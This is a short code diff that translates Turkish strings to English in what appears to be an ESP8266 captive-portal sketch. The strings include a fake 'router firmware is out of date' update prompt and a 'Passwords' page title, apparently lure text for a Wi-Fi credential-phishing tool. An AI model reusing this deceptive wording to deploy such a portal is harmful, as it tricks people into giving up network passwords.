@@ -7,11 +7,11 @@
 #include <EEPROM.h>
 
 // Default main strings.
-#define SUBTITLE "Yönlendirici bilgisi."
-#define TITLE "Güncelleme"
-#define BODY "Yönlendirici firmware'iniz güncel değil. Normal taramaya devam etmek için firmware'inizi güncelleyin."
+#define SUBTITLE "Router info."
+#define TITLE "Update"
+#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
 #define POST_TITLE "Updating..."
-#define POST_BODY "Yönlendiriciniz güncelleniyor. Lütfen işlem tamamlanana kadar bekleyin.. </br> Teşekkür ederim."
+#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
 #define PASS_TITLE "Passwords"
 #define CLEAR_TITLE "Cleared"
 
